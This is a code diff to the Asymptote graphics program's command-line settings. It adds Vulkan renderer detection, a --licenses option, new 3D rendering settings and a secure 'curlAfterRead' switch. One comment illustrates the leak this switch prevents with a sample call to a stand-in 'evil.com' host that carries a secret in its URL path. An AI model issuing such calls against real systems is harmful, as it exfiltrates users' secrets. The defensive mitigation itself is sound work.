@@ -13,24 +13,26 @@
 #include <cfloat>
 #include <clocale>
 #include <algorithm>
+#include <getopt.h>
+#include <fstream>
 
 #if defined(_WIN32)
 #include <Windows.h>
 #include <io.h>
 #define isatty _isatty
-
-#include "win32helpers.h"
 #else
 #include <unistd.h>
+#ifdef __APPLE__
+#include <mach-o/dyld.h>
+#endif
 #endif
 
 #include "common.h"
-
-#if HAVE_GNU_GETOPT_H
-#include <getopt.h>
-#else
-#include "getopt.h"
+#include "rendererloader.h"
+#ifdef HAVE_RENDERER
+#include "renderBase.h"
 #endif
+
 
 #include "util.h"
 #include "settings.h"
@@ -44,8 +46,6 @@
 #include "pipestream.h"
 #include "array.h"
 
-#include "glrender.h"
-
 #ifdef HAVE_LIBCURSES
 extern "C" {
 
@@ -53,6 +53,10 @@ extern "C" {
 #define USE_SETUPTERM
 #include <ncurses/curses.h>
 #include <ncurses/term.h>
+#elif HAVE_NCURSESW_CURSES_H
+#define USE_SETUPTERM
+#include <ncursesw/curses.h>
+#include <ncursesw/term.h>
 #elif HAVE_NCURSES_H
 #define USE_SETUPTERM
 #include <ncurses.h>
@@ -101,10 +105,36 @@ const bool havegl=false;
 mode_t mask;
 #endif
 
-string systemDir=ASYMPTOTE_SYSDIR;
+// Flag set by --version option to exit after all options are parsed
+static bool showVersion=false;
+
+// Use the compiled-in sysdir if it exists on disk; otherwise fall back to a
+// path relative to the running executable so that a staged installation works
+// when moved to a different location.
+static string initSysdir() {
+#if defined(__APPLE__) && defined(IS_RELOCATABLE)
+  char buf[4096];
+  uint32_t size = (uint32_t)sizeof(buf);
+  if (_NSGetExecutablePath(buf, &size) != 0)
+    return "";
+  string exe(buf);
+  // Strip the executable filename to get the bin directory.
+  size_t slash = exe.rfind('/');
+  if (slash == string::npos)
+    return "";
+  // Strip the bin directory to get the installation prefix.
+  size_t slash2 = exe.substr(0, slash).rfind('/');
+  if (slash2 == string::npos)
+    return "";
+  return exe.substr(0, slash2) + "/share/asymptote";
+#endif
+  return ASYMPTOTE_SYSDIR;
+}
+
+string systemDir=initSysdir();
 string defaultPSdriver="ps2write";
 string defaultEPSdriver="eps2write";
-string defaultPNGdriver="png16m"; // pngalpha has issues at high resolutions
+string defaultPNGdriver="png16malpha"; // pngalpha has issues at high resolutions
 string defaultAsyGL="https://vectorgraphics.github.io/asymptote/base/webgl/asygl-"+
   string(AsyGLVersion)+".js";
 
@@ -297,6 +327,7 @@ char *argv0;
 Int verbose;
 bool debug;
 bool xasy;
+bool keys;
 
 bool quiet=false;
 
@@ -315,9 +346,22 @@ bool safe=true;
 bool globalRead=true;
 // Enable writing to (or changing to) other directories
 bool globalWrite=false;
+// Flag set when input() reads any file
+bool haveReadFile=false;
+// Set true only if -curlAfterRead was explicitly given on the command line
+bool curlOverride=false;
 
 bool globalwrite() {return globalWrite || !safe;}
 bool globalread() {return globalRead || !safe;}
+
+#ifdef HAVE_LIBCURL
+// Blocking libcurl prevents DNS/log leakage: even a failed URL request
+// (e.g., input("https://evil.com/root-password-is-123")) exposes the URL
+// path and the user's IP address in the remote server's logs.
+bool curlEnabled() {return curlOverride || !haveReadFile;}
+#else
+bool curlEnabled() {return false;}
+#endif
 
 const string suffix="asy";
 const string guisuffix="gui";
@@ -442,7 +486,7 @@ struct option : public gc {
 
   // Outputs description of the command for the -help option.
   virtual void describe(char option) {
-    // Don't show the option if it has no desciption.
+    // Don't show the option if it has no description.
     if(!hide() && ((option == 'h') ^ env())) {
       const unsigned WIDTH=22;
       string start=describeStart();
@@ -975,7 +1019,7 @@ void addOption(option *o) {
 void version()
 {
   cerr << PACKAGE_NAME << " version " << REVISION
-       << " [(C) 2004 Andy Hammerlindl, John C. Bowman, Tom Prince]"
+       << " [(C) 2004-2026 Andy Hammerlindl, John C. Bowman, Tom Prince]"
        << endl;
 }
 
@@ -1030,19 +1074,49 @@ struct versionOption : public option {
   versionOption(string name, char code, string desc)
     : option(name, code, noarg, desc, true) {}
 
-  bool disabled;
-
-  const void feature(const char *s, bool enabled) {
-    if(enabled ^ disabled)
-      cerr << s << endl;
+  bool getOption() {
+    showVersion = true;
+    return true;
   }
+};
 
-  void features(bool enabled) {
-    disabled=!enabled;
-    cerr << endl << (disabled ? "DIS" : "EN") << "ABLED OPTIONS:" << endl;
+void displayFeatures(bool enabled)
+{
+#ifdef _WIN32
+    // On Windows, Vulkan availability is determined at compile time.
+    // Runtime probing via GetProcAddress/tryLoadVulkan is unreliable
+    // when asy.exe is distributed to different machines.
+#else
+    static bool probed = false;
+    if (!probed) {
+#ifdef HAVE_RENDERER
+        // Actually construct the renderer so we can verify which backend
+        // is truly available (not just whether the .so loads).  We call
+        // createRenderer() directly rather than initRenderer() to avoid
+        // triggering a "No 3D rendering available" error when running
+        // headless (e.g., --version on a system without GPU).
+        camp::createRenderer();
+#else
+#ifdef HAVE_VULKAN
+        static bool vulkanAvailable = false;
+        bool useVulkan = getSetting<bool>("vulkan");
+        vulkanAvailable = useVulkan && camp::tryLoadVulkan();
+#endif
+#endif
+        probed = true;
+    }
+#endif
+
+    cerr << endl << (enabled ? "EN" : "DIS") << "ABLED OPTIONS:" << endl;
+
+    auto feature = [&](const char *s, bool cond) {
+        if(cond == enabled)
+            cerr << s << endl;
+    };
 
     bool glm=false;
-    bool gl=false;
+    bool havevulkan=false;
+    bool haveopengl=false;
     bool ssbo=false;
     bool gsl=false;
     bool fftw3=false;
@@ -1060,12 +1134,38 @@ struct versionOption : public option {
     glm=true;
 #endif
 
-#ifdef HAVE_GL
-    gl=true;
+#ifdef _WIN32
+#ifdef HAVE_LIBVULKAN
+    havevulkan = true;
+#endif
+#else
+#ifdef HAVE_RENDERER
+    // The renderer was already constructed by createRenderer() above.
+    // camp::gl != nullptr means a backend was successfully loaded; vulkan
+    // indicates which one.
+    if (camp::gl != nullptr) {
+        if (vulkan)
+            havevulkan = true;
+        else
+            haveopengl = true;
+    }
+#else
+#ifdef HAVE_VULKAN
+    if (vulkanAvailable)
+        havevulkan = true;
+    else {
+        // Probe for OpenGL shared library at runtime.
+        bool openglAvailable = camp::tryLoadOpenGL();
+        if (openglAvailable)
+            haveopengl = true;
+    }
+#endif
+#endif
 #endif
 
 #ifdef HAVE_SSBO
-    ssbo=true;
+    if (haveopengl)
+        ssbo=true;
 #endif
 
 #ifdef HAVE_LIBGSL
@@ -1116,12 +1216,9 @@ struct versionOption : public option {
 
     feature("V3D      3D vector graphics output",glm && xdr);
     feature("WebGL    3D HTML rendering",glm);
-#ifdef HAVE_LIBOSMESA
-    feature("OpenGL   3D OSMesa offscreen rendering",gl);
-#else
-    feature("OpenGL   3D OpenGL rendering",gl);
-#endif
-    feature("SSBO     GLSL shader storage buffer objects",ssbo);
+    feature("OpenGL   3D OpenGL rendering",haveopengl);
+    feature("Vulkan   3D Vulkan rendering",havevulkan);
+    feature("SSBO     OpenGL shader storage buffer objects",ssbo);
     feature("GSL      GNU Scientific Library (special functions)",gsl);
     feature("FFTW3    Fast Fourier transforms",fftw3);
     feature("Eigen    Eigenvalue library",eigen);
@@ -1134,13 +1231,228 @@ struct versionOption : public option {
     feature("Sigsegv  Distinguish stack overflows from segmentation faults",
             sigsegv);
     feature("GC       Boehm garbage collector",usegc);
-    feature("threads  Render OpenGL in separate thread",usethreads);
+    feature("threads  Render 3D scenes in a separate thread",usethreads);
+}
+
+// Short license summary printed by asy --licenses.
+static const char *const licensesSummary =
+  "\n"
+#if defined(_WIN32)
+  "Asymptote is free software under the GNU General Public\n"
+  "License v3+ (see licenses/LICENSE).\n"
+#else
+  "Asymptote is free software under the GNU Lesser General Public\n"
+  "License v3+ (see licenses/LICENSE and licenses/LICENSE.LESSER).\n"
+#endif
+  "\n"
+  "Third-party components:\n"
+  "\n"
+  // URLs separated from \n to avoid confusing IDEs that support hyperlinking.
+  "  span.hpp          Boost Software License 1.0\n"
+  "                    Martin Moene -- https://github.com/martinmoene/span-lite" "\n"
+  "  wyhash            The Unlicense (Public Domain)\n"
+  "                    Wang Yi -- https://github.com/wangyi-fudan/wyhash" "\n"
+  "  Boehm GC          Custom permissive license\n"
+  "                    https://www.hboehm.info/gc/" "\n"
+  "  LspCpp            MIT License\n"
+  "                    https://github.com/kuafuwang/LspCpp" "\n"
+  "  libatomic_ops     MIT (core) / GPL-2.0 (extensions)\n"
+  "                    https://github.com/ivmai/libatomic_ops" "\n"
+  "  GLEW              BSD 3-Clause License\n"
+  "                    https://glew.sourceforge.net/" "\n"
+  "  TinyEXR           BSD 3-Clause License\n"
+  "                    Syoyo Fujita -- https://github.com/syoyo/tinyexr" "\n"
+  "\n"
+  "Use --licenses=full for complete copyright notices and license texts.\n"
+  "Source: https://github.com/vectorgraphics/asymptote/\n";
+
+// Resolve the directory containing the license files at runtime.
+// Search order: dirname(argv0)/doc/licenses/ (local/build-tree layout),
+// then the compile-time install path ASYMPTOTE_LICENSEDIR.
+static string resolveLicenseDir() {
+  if (argv0) {
+    string local = stripFile(string(argv0)) + "doc" + dirsep + "licenses";
+    string probe = local + dirsep + "LICENSE";
+    struct stat st;
+    if (stat(probe.c_str(), &st) == 0)
+      return local;
+  }
+#ifdef ASYMPTOTE_LICENSEDIR
+  return ASYMPTOTE_LICENSEDIR;
+#else
+  return docdir + dirsep + "licenses";
+#endif
+}
+
+// Print the contents of a file to out. Returns true on success.
+static bool printLicenseFile(const string& path, ostream& out) {
+  std::ifstream f(path.c_str());
+  if (!f.is_open()) return false;
+  out << f.rdbuf();
+  return true;
+}
+
+// Print the full license text, reading from license files at runtime.
+// Returns true if all files were found and printed, false otherwise.
+static bool printLicensesFull(ostream& out) {
+  string ldir = resolveLicenseDir();
+  int missing = 0;
+
+  auto requireFile = [&](const string& filename, const string& desc) -> bool {
+    string path = ldir + dirsep + filename;
+    if (!printLicenseFile(path, out)) {
+      cerr << argv0 << ": license file not found: " << path << "\n";
+      cerr << "  (" << desc << ")\n";
+      ++missing;
+      return false;
+    }
+    return true;
+  };
+
+  // Platform-conditional preamble
+#if defined(_WIN32)
+  out <<
+    "\nAsymptote is free software under the GNU General Public License,\n"
+    "version 3 or later. Source code: https://github.com/vectorgraphics/asymptote/\n"
+    "\n"
+    "[The source code and non-Windows binaries are available under the more\n"
+    "permissive LGPL; see README.]\n"
+    "\n"
+    "The full text of the GNU General Public License (version 3) is reproduced below,\n"
+    "followed by the copyright notices and license terms for all incorporated\n"
+    "third-party components.\n";
+#else
+  out <<
+    "\nAsymptote is free software under the GNU Lesser General Public License,\n"
+    "version 3 or later. Source code: https://github.com/vectorgraphics/asymptote/\n"
+    "\n"
+    "The full texts of the GNU Lesser General Public License (version 3) and the\n"
+    "GNU General Public License (version 3) are reproduced below, followed by the\n"
+    "copyright notices and license terms for all incorporated third-party components.\n"
+    "\n"
+    "========================================================================\n"
+    "GNU LESSER GENERAL PUBLIC LICENSE, Version 3\n"
+    "========================================================================\n";
+  requireFile("LICENSE.LESSER",
+    "Asymptote -- GNU Lesser General Public License v3+");
+#endif
+
+  out <<
+    "\n"
+    "========================================================================\n"
+    "GNU GENERAL PUBLIC LICENSE, Version 3\n"
+    "========================================================================\n";
+  requireFile("LICENSE",
+    "Asymptote -- GNU General Public License v3+");
+
+  out <<
+    "\n"
+    "========================================================================\n"
+    "THIRD-PARTY COMPONENT LICENSES\n"
+    "========================================================================\n"
+    "\n"
+    "This binary incorporates the following third-party components. The full\n"
+    "copyright notices and license terms required for binary redistribution are\n"
+    "reproduced below.\n";
+
+  out <<
+    "\n"
+    "------------------------------------------------------------------------\n"
+    "span.hpp -- Boost Software License 1.0\n"
+    "Martin Moene <https://github.com/martinmoene/span-lite>\n"
+    "------------------------------------------------------------------------\n";
+  requireFile("span-LICENSE.txt",
+    "span.hpp -- Boost Software License 1.0 -- Martin Moene");
+
+  out <<
+    "\n"
+    "------------------------------------------------------------------------\n"
+    "wyhash -- The Unlicense (Public Domain)\n"
+    "Wang Yi <https://github.com/wangyi-fudan/wyhash>\n"
+    "------------------------------------------------------------------------\n";
+  requireFile("wyhash-UNLICENSE.txt",
+    "wyhash -- The Unlicense -- Wang Yi");
+
+  out <<
+    "\n"
+    "------------------------------------------------------------------------\n"
+    "Boehm-Demers-Weiser Garbage Collector -- Custom permissive license\n"
+    "Hans-J. Boehm, Alan J. Demers, Xerox Corporation, Silicon Graphics,\n"
+    "Hewlett-Packard Development Company, Ivan Maidanski, Fergus Henderson\n"
+    "<https://www.hboehm.info/gc/>\n"
+    "------------------------------------------------------------------------\n";
+  requireFile("gc-LICENSE.txt",
+    "Boehm GC -- Custom permissive license -- https://www.hboehm.info/gc/");
+
+  out <<
+    "\n"
+    "------------------------------------------------------------------------\n"
+    "LspCpp -- MIT License\n"
+    "kuafuwang <https://github.com/kuafuwang/LspCpp>\n"
+    "------------------------------------------------------------------------\n";
+  requireFile("LspCpp-LICENSE.txt",
+    "LspCpp -- MIT License -- https://github.com/kuafuwang/LspCpp");
+
+  out <<
+    "\n"
+    "------------------------------------------------------------------------\n"
+    "libatomic_ops -- MIT License (core) / GPL-2.0 (gpl extension library)\n"
+    "Xerox Corporation, Silicon Graphics, Hewlett-Packard, Ivan Maidanski,\n"
+    "and contributors <https://github.com/ivmai/libatomic_ops>\n"
+    "------------------------------------------------------------------------\n";
+  requireFile("libatomic_ops-LICENSE.txt",
+    "libatomic_ops -- MIT License (core) -- https://github.com/ivmai/libatomic_ops");
+
+  out <<
+    "\n"
+    "------------------------------------------------------------------------\n"
+    "(libatomic_ops GPL-2.0 extension library license)\n"
+    "------------------------------------------------------------------------\n";
+  requireFile("libatomic_ops-COPYING.txt",
+    "libatomic_ops -- GPL-2.0 (gpl extension) -- https://github.com/ivmai/libatomic_ops");
+
+  out <<
+    "\n"
+    "------------------------------------------------------------------------\n"
+    "GLEW -- BSD 3-Clause License\n"
+    "Nigel Stewart, Milan Ikits, Marcelo E. Magallon, Lev Povalahev,\n"
+    "Brian Paul, The Khronos Group <https://glew.sourceforge.net/>\n"
+    "------------------------------------------------------------------------\n";
+  requireFile("glew-LICENSE.txt",
+    "GLEW -- BSD 3-Clause License -- https://glew.sourceforge.net/");
+
+  out <<
+    "\n"
+    "------------------------------------------------------------------------\n"
+    "TinyEXR -- BSD 3-Clause License\n"
+    "Syoyo Fujita and contributors <https://github.com/syoyo/tinyexr>\n"
+    "------------------------------------------------------------------------\n";
+  requireFile("tinyexr-LICENSE.txt",
+    "TinyEXR -- BSD 3-Clause License -- https://github.com/syoyo/tinyexr");
+
+  return missing == 0;
+}
+
+struct licensesOption : public option {
+  licensesOption(string name, char code, string desc)
+    : option(name, code, noarg, desc, true) {}
+
+  // Accept an optional "=full" argument (long option only).
+  void longopt(c_option &o) override {
+    o.name=name.c_str();
+    o.has_arg=optional_argument;
+    o.flag=0;
+    o.val=0;
   }
 
-  bool getOption() {
+  bool getOption() override {
     version();
-    features(1);
-    features(0);
+    if (optarg && string(optarg) == "full") {
+      bool success = printLicensesFull(cerr);
+      exit(success ? 0 : 1);
+    } else {
+      cerr << licensesSummary;
+    }
     exit(0);
 
     // Unreachable code.
@@ -1245,7 +1557,17 @@ void getOptions(int argc, char *argv[])
       syntax=true;
     }
 
+    if (showVersion) {
+      // Don't exit yet — continue parsing remaining options
+    }
+
     errno=0;
+  }
+
+  if (showVersion) {
+    // Don't exit yet — continue parsing remaining options, then exit
+    // from setOptions() after setPath() has been called so that the
+    // renderer can locate its shared libraries.
   }
 
   if (syntax)
@@ -1340,13 +1662,23 @@ void initSettings() {
   addOption(new stringSetting("imageDir", 0,"str","Environment image library directory","ibl"));
   addOption(new stringSetting("imageURL", 0,"str","Environment image library URL","https://vectorgraphics.gitlab.io/asymptote/ibl"));
   addOption(new realSetting("render", 0, "n",
-                            "Render 3D graphics using n pixels per bp (-1=auto)",
-                            havegl ? -1.0 : 0.0));
-  addOption(new realSetting("devicepixelratio", 0, "n", "Ratio of physical to logical pixels", 1.0));
+                            "Render 3D graphics using n pixels per bp",
+                            havegl ? 2.0 : 0.0));
+  addOption(new realSetting("devicepixelratio", 0, "n", "Ratio of physical to logical pixels", 0.0));
   addOption(new IntSetting("antialias", 0, "n",
                            "Antialiasing width for rasterized output", 2));
   addOption(new IntSetting("multisample", 0, "n",
                            "Multisampling width for screen images", 4));
+  addOption(new boolSetting("fxaa", 0,
+                           "Enable FXAA. Multisampling is turned off if FXAA is enabled", false));
+  addOption(new boolSetting("vsync", 0,
+                           "Vertically synchronize with monitor", false));
+  addOption(new boolSetting("srgb", 0,
+                            "Render 3D images in sRGB space", false));
+  addOption(new boolSetting("offscreen", 0,
+                            "Use offscreen rendering", false));
+  addOption(new IntSetting("device", 0, "n",
+                           "Set Vulkan device", -1));
   addOption(new boolSetting("twosided", 0,
                             "Use two-sided 3D lighting model for rendering",
                             true));
@@ -1361,6 +1693,8 @@ void initSettings() {
                            "Compute shader local size", 256));
   addOption(new IntSetting("GPUblockSize", 0, "n",
                            "Compute shader block size", 8));
+  addOption(new IntSetting("maxFramesInFlight", 0, "n",
+                           "Maximum frames queued to the GPU", 3));
 
   addOption(new pairSetting("position", 0, "pair",
                             "Initial 3D rendering screen position"));
@@ -1376,7 +1710,7 @@ void initSettings() {
   addOption(new pairSetting("maxtile", 0, "pair",
                             "Maximum rendering tile size",pair(1024,768)));
   addOption(new boolSetting("iconify", 0,
-                            "Iconify rendering window", false));
+                            "", false));
   addOption(new boolSetting("thick", 0,
                             "Render thick 3D lines", true));
   addOption(new boolSetting("thin", 0,
@@ -1385,6 +1719,8 @@ void initSettings() {
                             "3D labels always face viewer by default", true));
   addOption(new boolSetting("threads", 0,
                             "Use POSIX threads for 3D rendering", true));
+  addOption(new boolSetting("vulkan", 0,
+                            "Use Vulkan renderer if available", true));
   addOption(new boolSetting("fitscreen", 0,
                             "Fit rendered image to screen", true));
   addOption(new boolSetting("interactiveWrite", 0,
@@ -1393,6 +1729,7 @@ void initSettings() {
   addOption(new helpOption("help", 'h', "Show summary of options"));
   addOption(new helpOption("environment", 'e', "Show summary of environment settings"));
   addOption(new versionOption("version", 0, "Show version"));
+  addOption(new licensesOption("licenses", 0, "Show license and third-party attribution"));
 
   addOption(new pairSetting("offset", 'O', "pair", "PostScript offset"));
   addOption(new pairSetting("aligndir", 0, "pair",
@@ -1421,7 +1758,7 @@ void initSettings() {
   addOption(new boolSetting("embed", 0, "Embed rendered preview image", true));
   addOption(new boolSetting("auto3D", 0, "Automatically activate 3D scene",
                             true));
-  addOption(new boolSetting("autoplay", 0, "Autoplay 3D animations", false));
+  addOption(new boolSetting("autoplay", 0, "Autoplay 3D WebGL animations", true));
   addOption(new boolSetting("loop", 0, "Loop 3D animations", false));
   addOption(new boolSetting("interrupt", 0, "", false));
   addOption(new boolSetting("animating", 0, "", false));
@@ -1468,6 +1805,9 @@ void initSettings() {
   addSecureSetting(new boolrefSetting("globalread", 0,
                                       "Allow read from other directory",
                                       &globalRead, true));
+  addSecureSetting(new boolrefSetting("curlAfterRead", 0,
+                                      "Allow libcurl after reading local files via input()",
+                                      &curlOverride, false));
   addSecureSetting(new stringSetting("outname", 'o', "name",
                                      "Alternative output directory/file prefix"));
   addOption(new stringOption("cd", 0, "directory", "Set current directory",
@@ -1487,6 +1827,8 @@ void initSettings() {
                             "Input code over multiple lines at the prompt"));
   addOption(new boolrefSetting("xasy", 0,
                             "Interactive mode for xasy",&xasy));
+  addOption(new boolrefSetting("keys", 0,
+                            "Generate WebGL keys",&keys));
 
   addOption(new boolSetting("lsp", 0, "Interactive mode for the Language Server Protocol"));
   addOption(new envSetting("lspport", ""));
@@ -1533,6 +1875,8 @@ void initSettings() {
 
   addOption(new realSetting("zoomfactor", 0, "factor", "Zoom step factor",
                             1.05));
+  addOption(new realSetting("zoomThreshold", 0, "threshold",
+                            "Zoom remesh threshold", 0.02));
   addOption(new realSetting("zoomPinchFactor", 0, "n",
                             "WebGL zoom pinch sensitivity", 10));
   addOption(new realSetting("zoomPinchCap", 0, "limit",
@@ -2000,6 +2344,13 @@ void setOptions(int argc, char *argv[])
   SetPageDimensions();
 
   setInteractive();
+
+  if (showVersion) {
+    version();
+    displayFeatures(true);
+    displayFeatures(false);
+    exit(0);
+  }
 }
 
 }
